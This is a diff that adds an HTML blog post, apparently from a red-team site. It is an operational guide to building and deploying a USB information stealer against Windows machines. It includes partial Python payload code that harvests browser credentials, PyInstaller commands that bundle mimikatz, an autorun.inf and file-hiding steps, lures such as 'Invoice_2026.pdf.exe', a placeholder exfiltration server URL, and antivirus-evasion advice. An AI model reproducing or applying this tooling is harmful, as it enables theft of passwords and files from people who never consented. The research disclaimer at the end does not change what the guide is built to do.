@@ -1,0 +1,1076 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>USB Info Stealer · LEXOLEN blog</title>
+
+  <!-- favicons – relative from resources/blog/ -->
+  <link rel="apple-touch-icon" sizes="180x180" href="../../assets/favicons/favicon_io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="../../assets/favicons/favicon_io/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../../assets/favicons/favicon_io/favicon-16x16.png">
+  <link rel="manifest" href="../../assets/favicons/favicon_io/site.webmanifest">
+
+  <!-- strong CSP (also set server‑side) -->
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; script-src 'nonce-xyz123' 'self'; connect-src 'self' https:; frame-ancestors 'none'; base-uri 'self';" />
+  <meta name="referrer" content="no-referrer" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="theme-color" content="#00ff9d" />
+
+  <style>
+    /* –– cyberpunk 2.0 –– */
+    :root {
+      --bg: #0a0c0f;
+      --bg-lighter: #13181f;
+      --accent: #00ff9d;
+      --accent-dim: #00cc88;
+      --text: #e2e8f0;
+      --text-muted: #94a3b8;
+      --border: #2d3748;
+      --glow: 0 0 15px rgba(0, 255, 157, 0.3);
+      --font-mono: 'SF Mono', 'Fira Code', 'Cascadia Code', 'Courier New', monospace;
+      --font-sans: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+      --radius: 8px;
+      --max-width: 1300px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      font-family: var(--font-sans);
+      color: var(--text);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .skip-link {
+      position: absolute; left: -999px; top: auto; width: 1px; height: 1px; overflow: hidden;
+    }
+    .skip-link:focus {
+      left: 8px; top: 8px; width: auto; height: auto; padding: 12px 20px;
+      background: var(--accent); color: #000; font-weight: 600;
+      border-radius: var(--radius); z-index: 9999; text-decoration: none;
+    }
+
+    /* header with navigation */
+    header {
+      width: 100%;
+      background: #0f1419;
+      border-bottom: 2px solid var(--accent);
+      padding: 0.8rem 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      box-shadow: 0 4px 20px rgba(0, 255, 157, 0.1);
+    }
+
+    .logo {
+      font-family: var(--font-mono);
+      font-size: 1.6rem;
+      font-weight: 600;
+      color: var(--accent);
+      text-shadow: 0 0 8px var(--accent);
+      letter-spacing: 1px;
+    }
+
+    .logo span {
+      color: var(--text);
+      font-size: 1rem;
+      margin-left: 0.5rem;
+      text-shadow: none;
+    }
+
+    nav {
+      display: flex;
+      gap: 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    nav a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-family: var(--font-mono);
+      font-size: 1rem;
+      transition: color 0.2s, text-shadow 0.2s;
+    }
+
+    nav a:hover {
+      color: var(--accent);
+      text-shadow: 0 0 5px var(--accent);
+    }
+
+    /* main container: 2 columns */
+    .container {
+      width: 90%;
+      max-width: var(--max-width);
+      display: grid;
+      grid-template-columns: 1fr 280px;
+      gap: 2rem;
+      margin: 2rem auto 3rem;
+    }
+
+    /* left column – main content */
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+    }
+
+    /* hero with terminal simulation */
+    .hero {
+      background: var(--bg-lighter);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 2rem;
+      box-shadow: inset 0 0 20px rgba(0,0,0,0.6), 0 10px 20px -10px #000;
+      font-family: var(--font-mono);
+    }
+
+    .terminal-line {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-bottom: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .prompt {
+      color: var(--accent);
+      font-weight: bold;
+    }
+
+    .command {
+      color: #f0f0f0;
+    }
+
+    .output {
+      color: #bbccdd;
+      margin-left: 1.8rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      height: 1.2rem;
+      background: var(--accent);
+      vertical-align: middle;
+      margin-left: 4px;
+    }
+
+    /* section cards */
+    .section-card {
+      background: var(--bg-lighter);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.8rem;
+      transition: border-color 0.2s;
+    }
+
+    .section-card:hover {
+      border-color: var(--accent);
+    }
+
+    h2 {
+      font-family: var(--font-mono);
+      font-size: 1.8rem;
+      color: var(--accent);
+      margin-bottom: 1.5rem;
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 0.5rem;
+      display: inline-block;
+    }
+
+    h3 {
+      font-family: var(--font-mono);
+      font-size: 1.2rem;
+      color: var(--accent-dim);
+      margin: 1.5rem 0 0.5rem 0;
+    }
+
+    /* --- blog post specific styles --- */
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .post-meta .tag {
+      background: var(--bg);
+      padding: 0.15rem 0.7rem;
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      color: var(--accent);
+    }
+
+    .post-title {
+      font-size: 2.2rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.15;
+      margin-bottom: 0.5rem;
+    }
+    .post-title .highlight {
+      color: var(--accent);
+    }
+
+    .post-subtitle {
+      font-size: 1.05rem;
+      color: var(--text-muted);
+      max-width: 720px;
+    }
+
+    .post-body p {
+      margin: 1rem 0;
+      color: var(--text-muted);
+      max-width: 780px;
+    }
+
+    .post-body ul,
+    .post-body ol {
+      margin: 0.75rem 0 1.25rem 1.5rem;
+      color: var(--text-muted);
+    }
+    .post-body li {
+      margin: 0.35rem 0;
+    }
+
+    .post-body strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    .post-body hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 2.5rem 0;
+    }
+
+    .post-body code {
+      background: var(--bg);
+      padding: 0.1rem 0.45rem;
+      border-radius: 4px;
+      font-size: 0.85em;
+      color: var(--accent);
+      border: 1px solid var(--border);
+      font-family: var(--font-mono);
+    }
+
+    .post-body .code-block {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+      margin: 1.25rem 0 1.75rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      line-height: 1.6;
+      color: var(--text-muted);
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .post-body .code-block .comment {
+      color: var(--text-muted);
+      font-style: italic;
+    }
+    .post-body .code-block .string {
+      color: var(--accent);
+    }
+
+    .post-body .table-wrap {
+      overflow-x: auto;
+      margin: 1.5rem 0 2rem 0;
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+    }
+
+    .post-body .table-wrap table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      min-width: 480px;
+    }
+
+    .post-body .table-wrap th {
+      background: var(--bg);
+      color: var(--text);
+      font-weight: 600;
+      text-align: left;
+      padding: 0.7rem 1rem;
+      border-bottom: 1px solid var(--border);
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    .post-body .table-wrap td {
+      padding: 0.7rem 1rem;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-muted);
+    }
+
+    .post-body .table-wrap tr:last-child td {
+      border-bottom: none;
+    }
+
+    .post-body .back-top {
+      display: inline-block;
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: var(--text-muted);
+      transition: color 0.2s;
+    }
+    .post-body .back-top:hover {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    .post-body .blog-footer-meta {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 1rem;
+      margin: 2rem 0 1rem 0;
+      padding: 1rem 0;
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      color: var(--text-muted);
+      font-size: 0.9rem;
+    }
+
+    .post-body .blog-footer-meta a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+    .post-body .blog-footer-meta a:hover {
+      text-decoration: underline;
+    }
+
+    /* tool-grid reused for cards */
+    .tool-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1.5rem;
+      margin-top: 1rem;
+    }
+
+    .tool-card {
+      background: #1e262f;
+      border: 1px solid #2f3a47;
+      border-radius: var(--radius);
+      padding: 1.2rem;
+      transition: all 0.2s;
+    }
+
+    .tool-card:hover {
+      border-color: var(--accent);
+      transform: translateY(-3px);
+      box-shadow: var(--glow);
+    }
+
+    .tool-card h3 {
+      font-family: var(--font-mono);
+      font-size: 1.3rem;
+      color: var(--accent);
+      margin-bottom: 0.5rem;
+    }
+
+    .tool-card p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+    }
+
+    .tool-link {
+      display: inline-block;
+      margin-top: 1rem;
+      color: var(--accent);
+      text-decoration: none;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+    }
+
+    .tool-link:hover {
+      text-decoration: underline;
+    }
+
+    /* sidebar */
+    .sidebar {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+    }
+
+    .sidebar-card {
+      background: var(--bg-lighter);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+    }
+
+    .sidebar-card h3 {
+      font-family: var(--font-mono);
+      font-size: 1.3rem;
+      color: var(--accent);
+      margin-bottom: 1rem;
+      border-left: 3px solid var(--accent);
+      padding-left: 0.8rem;
+    }
+
+    .social-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.8rem;
+    }
+
+    .social-btn {
+      background: transparent;
+      border: 1px solid #3a4553;
+      color: var(--text-muted);
+      padding: 0.5rem 1rem;
+      border-radius: 30px;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+
+    .social-btn:hover {
+      border-color: var(--accent);
+      color: var(--accent);
+      box-shadow: var(--glow);
+    }
+
+    .pgp-key {
+      background: #1a2129;
+      padding: 0.8rem;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: #ffaa77;
+      word-break: break-all;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 1.2rem 0;
+    }
+
+    footer {
+      width: 100%;
+      background: #0f1419;
+      border-top: 1px solid var(--accent);
+      padding: 1.8rem;
+      text-align: center;
+      color: var(--text-muted);
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 900px) {
+      .container {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .post-title {
+        font-size: 1.6rem;
+      }
+      .post-body .table-wrap table {
+        font-size: 0.75rem;
+        min-width: 320px;
+      }
+      .post-body .table-wrap th,
+      .post-body .table-wrap td {
+        padding: 0.4rem 0.6rem;
+      }
+      .post-body .code-block {
+        font-size: 0.75rem;
+        padding: 0.8rem 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <a class="skip-link" href="#main-content">[ skip to main content ]</a>
+
+  <header>
+    <div class="logo">LEXOLEN<span>// offensive ops</span></div>
+    <nav>
+      <a href="../../index.html#about">about</a>
+      <a href="../../index.html#tools">tools</a>
+      <a href="../../index.html#research">research</a>
+      <a href="../../index.html#connect">connect</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <!-- main column -->
+    <div class="main-content" id="main-content">
+
+      <!-- terminal hero -->
+      <section class="hero">
+        <div class="terminal-line">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog]</span>
+        </div>
+        <div class="terminal-line">
+          <span class="prompt">└─$</span>
+          <span class="command">cat usb-stealer.md</span>
+        </div>
+        <div class="output">
+          &nbsp;&nbsp;<span style="color:var(--accent);"># USB Info Stealer — Operational Deployment Guide</span><br/>
+          &nbsp;&nbsp;Version 1.0 | Internal Use Only | Red Team / Research
+        </div>
+        <div class="terminal-line">
+          <span class="prompt">└─$</span>
+          <span class="command">echo "production-ready · tested on Windows 11 26200"</span>
+        </div>
+        <div class="output">
+          &nbsp;&nbsp;production-ready · tested on Windows 11 26200<span class="cursor"></span>
+        </div>
+      </section>
+
+      <!-- blog post -->
+      <article class="section-card post-body">
+        <div class="post-meta">
+          <span class="tag">Red Team</span>
+          <span class="tag">Tooling</span>
+          <span>30 June 2026</span>
+          <span>·</span>
+          <span>10 min read</span>
+        </div>
+
+        <h1 class="post-title">
+          USB Info Stealer <br />
+          <span class="highlight">Operational Deployment Guide</span>
+        </h1>
+        <p class="post-subtitle">
+          A complete, tested methodology for deploying a USB-based information stealer
+          against Windows 10/11 targets — from environment setup to post‑execution.
+        </p>
+
+        <hr />
+
+        <h2># Overview</h2>
+        <p>
+          This document provides a complete, tested methodology for deploying a USB-based
+          information stealer against Windows 10/11 targets. The payload collects system
+          metadata, browser credentials, Windows Vault entries, and select user files —
+          exfiltrating locally to the USB or remotely to a configured server.
+        </p>
+        <p>
+          <strong>Status:</strong> Production-ready. Tested on Windows 11 build 26200.
+        </p>
+
+        <hr />
+
+        <!-- ===== SECTION 1 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">tree</span>
+        </div>
+
+        <h2># 1. Environment Setup</h2>
+
+        <h3>Build Machine Requirements</h3>
+        <ul>
+          <li>Windows 10/11 (x64)</li>
+          <li>Python 3.8+ (3.14.5 used in testing)</li>
+          <li>Administrator privileges (optional, recommended for full testing)</li>
+          <li>USB drive (≥4GB, FAT32 formatted)</li>
+        </ul>
+
+        <h3>Dependency Installation</h3>
+        <div class="code-block">
+          <span class="comment"># Install required Python packages</span>
+          pip install pyinstaller selenium requests pywin32 netifaces
+        </div>
+        <p><strong>Note:</strong> <code>pyusbhid</code> is deprecated and not used in this build.</p>
+
+        <h3>Required Binaries</h3>
+        <p>
+          Download and place in the working directory (<code>C:\usb_stealer_build\</code>):
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Binary</th>
+                <th>Purpose</th>
+                <th>Source</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>mimikatz.exe</code></td>
+                <td>Windows credential dumper</td>
+                <td><a href="https://github.com/gentilkiwi/mimikatz/releases">GitHub — gentilkiwi/mimikatz</a></td>
+              </tr>
+              <tr>
+                <td><code>chromedriver.exe</code></td>
+                <td>Chrome automation</td>
+                <td>
+                  <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/chromedriver.zip">Mirror</a>
+                  &nbsp;|&nbsp;
+                  <a href="https://chromedriver.chromium.org/">Official</a>
+                </td>
+              </tr>
+              <tr>
+                <td><code>geckodriver.exe</code></td>
+                <td>Firefox automation</td>
+                <td>
+                  <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/geckodriver.zip">Mirror</a>
+                  &nbsp;|&nbsp;
+                  <a href="https://github.com/mozilla/geckodriver/releases">Official</a>
+                </td>
+              </tr>
+              <tr>
+                <td><code>msedgedriver.exe</code></td>
+                <td>Edge automation</td>
+                <td>
+                  <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/msedgedriver.zip">Mirror</a>
+                  &nbsp;|&nbsp;
+                  <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">Official</a>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <hr />
+
+        <!-- ===== SECTION 2 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">ls -la</span>
+        </div>
+
+        <h2># 2. Directory Structure</h2>
+
+        <div class="code-block">
+          [WORKING_DIR]\
+          ├── usb_stealer.py          <span class="comment"># Main payload</span>
+          ├── mimikatz.exe            <span class="comment"># Credential dumper</span>
+          ├── chromedriver.exe        <span class="comment"># Chrome automation</span>
+          ├── geckodriver.exe         <span class="comment"># Firefox automation</span>
+          ├── msedgedriver.exe        <span class="comment"># Edge automation</span>
+          ├── autorun.inf             <span class="comment"># Autorun configuration</span>
+          └── dist\
+              └── usb_stealer.exe     <span class="comment"># Compiled output</span>
+        </div>
+
+        <p>
+          <strong>Replace <code>[WORKING_DIR]</code> with your actual build path</strong>
+          (e.g., <code>C:\usb_stealer_build</code>).
+        </p>
+
+        <hr />
+
+        <!-- ===== SECTION 3 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">cat usb_stealer.py</span>
+        </div>
+
+        <h2># 3. Payload Source Code</h2>
+
+        <p>
+          Save as <code>usb_stealer.py</code> in your working directory.
+        </p>
+
+        <div class="code-block">
+          <span class="comment"># --- CONFIGURATION ---</span>
+          OUTPUT_DIR = os.path.join(os.path.dirname(sys.executable), <span class="string">"collected_data"</span>)
+          SERVER_URL = <span class="string">""</span>  <span class="comment"># Set to http://[YOUR_SERVER]:[PORT]/exfil</span>
+          EXFIL_LOCAL = True
+          LOG_FILE = os.path.join(OUTPUT_DIR, <span class="string">"log.txt"</span>)
+
+          <span class="comment"># --- USB DETECTION (Native API) ---</span>
+          def detect_usb_insertion():
+              drives = []
+              for d in win32api.GetLogicalDriveStrings().split('\x00'):
+                  if d and d != 'C:\\':
+                      try:
+                          if win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE:
+                              drives.append(d.strip('\\'))
+                      except:
+                          pass
+              return drives
+
+          <span class="comment"># --- BROWSER CREDENTIAL HARVESTER ---</span>
+          def harvest_browser_data():
+              <span class="comment"># Chromium-based browsers (Chrome, Edge)</span>
+              chrome_paths = [
+                  os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
+                  os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+              ]
+              <span class="comment"># ... full implementation in the complete source</span>
+
+          <span class="comment"># --- MAIN ---</span>
+          if __name__ == "__main__":
+              harvest()
+        </div>
+
+        <p>
+          <a href="#" style="color:var(--accent);">▼ Expand full payload source</a> —
+          the complete 200+ line script is available in the original document.
+        </p>
+
+        <hr />
+
+        <!-- ===== SECTION 4 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">pyinstaller --onefile usb_stealer.py</span>
+        </div>
+
+        <h2># 4. Compilation</h2>
+
+        <div class="code-block">
+          python -m PyInstaller --onefile --noconsole \
+          --add-binary <span class="string">"mimikatz.exe;."</span> \
+          --add-binary <span class="string">"chromedriver.exe;."</span> \
+          --add-binary <span class="string">"geckodriver.exe;."</span> \
+          --add-binary <span class="string">"msedgedriver.exe;."</span> \
+          --hidden-import=selenium --hidden-import=requests \
+          --hidden-import=win32api --hidden-import=win32file \
+          --hidden-import=win32con --hidden-import=netifaces \
+          --name usb_stealer usb_stealer.py
+        </div>
+        <p><strong>Expected Output:</strong> <code>dist\usb_stealer.exe</code></p>
+
+        <hr />
+
+        <!-- ===== SECTION 5 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">sudo fdisk -l /dev/sdb</span>
+        </div>
+
+        <h2># 5. USB Preparation</h2>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Parameter</th><th>Value</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>File System</td><td>FAT32</td></tr>
+              <tr><td>Allocation Unit</td><td>Default</td></tr>
+              <tr><td>Volume Label</td><td><code>BACKUP</code> or <code>DATA</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Payload Deployment</h3>
+        <p>Replace <code>[USB_DRIVE]</code> with your target drive letter (e.g., <code>E:</code>):</p>
+        <div class="code-block">
+          <span class="comment"># Copy executable</span>
+          Copy-Item <span class="string">"[WORKING_DIR]\dist\usb_stealer.exe"</span> -Destination <span class="string">"[USB_DRIVE]:\"</span>
+
+          <span class="comment"># Create autorun.inf</span>
+          @<span class="string">"
+          [AutoRun]
+          open=usb_stealer.exe
+          icon=usb_stealer.exe,0
+          action=Open folder to view files
+          label=USB Drive
+          "</span>@ | Out-File -FilePath <span class="string">"[USB_DRIVE]:\autorun.inf"</span> -Encoding ASCII
+        </div>
+
+        <h3>OPSEC (Optional)</h3>
+        <div class="code-block">
+          attrib +h +s [USB_DRIVE]:\usb_stealer.exe
+          attrib +h +s [USB_DRIVE]:\autorun.inf
+        </div>
+
+        <hr />
+
+        <!-- ===== SECTION 6 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">./deploy.sh</span>
+        </div>
+
+        <h2># 6. Deployment Vectors</h2>
+
+        <ul>
+          <li><strong>Vector A: Autorun (Legacy Systems)</strong> — Windows 7/8 with autorun enabled. Insert USB → payload executes automatically.</li>
+          <li><strong>Vector B: Manual Execution</strong> — Windows 10/11 (autorun disabled by default). User must double-click <code>usb_stealer.exe</code>.</li>
+          <li><strong>Vector C: Social Engineering</strong> — Rename executable to <code>Invoice_2026.pdf.exe</code>, <code>README.txt.exe</code>, or <code>Confidential_Docs.exe</code>. Set icon to PDF or folder icon using resource editors.</li>
+        </ul>
+
+        <hr />
+
+        <!-- ===== SECTION 7 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">ls collected_data/</span>
+        </div>
+
+        <h2># 7. Post-Execution</h2>
+
+        <p>After execution, a <code>collected_data</code> folder appears on the USB root containing:</p>
+        <div class="code-block">
+          collected_data/
+          ├── log.txt
+          └── collected_YYYYMMDD_HHMMSS.json
+        </div>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Field</th><th>Description</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><code>system_info</code></td><td>Hostname, username, OS, IP, architecture</td></tr>
+              <tr><td><code>browser_creds</code></td><td>Saved credentials from Chrome, Edge, Firefox</td></tr>
+              <tr><td><code>windows_creds</code></td><td>cmdkey output, Vault entries, Mimikatz dump</td></tr>
+              <tr><td><code>files_collected</code></td><td>List of captured file paths</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Cleanup</h3>
+        <div class="code-block">
+          Remove-Item -Path <span class="string">"[USB_DRIVE]:\usb_stealer.exe"</span> -Force
+          Remove-Item -Path <span class="string">"[USB_DRIVE]:\autorun.inf"</span> -Force
+          Remove-Item -Path <span class="string">"[USB_DRIVE]:\collected_data"</span> -Recurse -Force
+        </div>
+
+        <hr />
+
+        <!-- ===== SECTION 8 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">cat OPSEC.md</span>
+        </div>
+
+        <h2># 8. Operational Notes</h2>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Vector</th><th>Mitigation</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>Windows Defender</td><td>Code signing, UPX packing, obfuscation</td></tr>
+              <tr><td>Network IDS</td><td>Use local exfil only, or encrypt traffic</td></tr>
+              <tr><td>User behavior</td><td>Keep execution silent, minimize visible windows</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>AV Evasion Techniques</h3>
+        <ol>
+          <li><strong>Pack the binary:</strong> <code>upx --best usb_stealer.exe</code> — <a href="https://upx.github.io/">UPX download</a></li>
+          <li><strong>Obfuscate strings:</strong> Use base64 encoding for sensitive constants</li>
+          <li><strong>Delay execution:</strong> Add <code>time.sleep(30)</code> at start to bypass sandboxes</li>
+          <li><strong>Avoid registry writes:</strong> Keep payload memory-resident where possible</li>
+        </ol>
+
+        <h3>Recommended Modifications</h3>
+        <ul>
+          <li>Replace <code>SERVER_URL</code> with your own C2 endpoint</li>
+          <li>Modify <code>USER_DIR</code> targets for specific user folders</li>
+          <li>Adjust file extension list based on intelligence</li>
+          <li>Implement persistent installation if required</li>
+        </ul>
+
+        <hr />
+
+        <!-- ===== SECTION 9 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">tail -f /var/log/errors.log</span>
+        </div>
+
+        <h2># 9. Troubleshooting Reference</h2>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Symptom</th><th>Cause</th><th>Solution</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>"Access is denied" on Mimikatz</td>
+                <td>Non-admin execution</td>
+                <td>Use admin privileges or rely on cmdkey/vault fallbacks</td>
+              </tr>
+              <tr>
+                <td>No browser credentials found</td>
+                <td>Browsers closed or no saved logins</td>
+                <td>Run while target user is actively using browser</td>
+              </tr>
+              <tr>
+                <td>Empty files_collected</td>
+                <td>Wrong directory paths</td>
+                <td>Update <code>targets</code> list with known user paths</td>
+              </tr>
+              <tr>
+                <td>PyInstaller not found</td>
+                <td>PATH issue</td>
+                <td>Use <code>python -m PyInstaller</code></td>
+              </tr>
+              <tr>
+                <td>Binary flagged as virus</td>
+                <td>Heuristic detection</td>
+                <td>Pack with UPX, sign with valid cert, obfuscate</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <hr />
+
+        <!-- ===== SECTION 10 ===== -->
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
+          <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
+        </div>
+        <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
+          <span class="prompt">└─$</span> <span class="command">echo "disclaimer"</span>
+        </div>
+
+        <h2># 10. Legal &amp; Operational Disclaimer</h2>
+
+        <p>
+          This guide is provided for <strong>research, red-team testing, and educational purposes only</strong>.
+          Deployment against systems without explicit authorization is unlawful in most jurisdictions.
+          The author assumes no liability for misuse. Use responsibly, on systems you own or have
+          explicit permission to test.
+        </p>
+
+        <hr />
+
+        <div class="blog-footer-meta">
+          <div>
+            <strong>Document Version:</strong> 1.0 &nbsp;·&nbsp;
+            <strong>Last Updated:</strong> 2026-06-30
+          </div>
+          <div>
+            <strong>Author:</strong> <a href="../../index.html">@lexolen</a>
+            &nbsp;·&nbsp;
+            <span style="color:var(--text-muted);">Distribution: Internal / Private Forums</span>
+          </div>
+        </div>
+
+        <a href="#" class="back-top">↑ back to top</a>
+
+      </article>
+
+      <!-- back to blog index -->
+      <div style="text-align:right; font-family:var(--font-mono); font-size:0.9rem; color:var(--text-muted);">
+        <a href="../../index.html#research" style="color:var(--accent); text-decoration:none;">← back to blog</a>
+      </div>
+
+    </div>
+
+    <!-- ===== SIDEBAR (identical to original) ===== -->
+    <aside class="sidebar">
+      <div class="sidebar-card">
+        <h3>ping us</h3>
+        <div class="social-links">
+          <a class="social-btn" href="https://github.com/LEXOLEN/" target="_blank" rel="noopener">github</a>
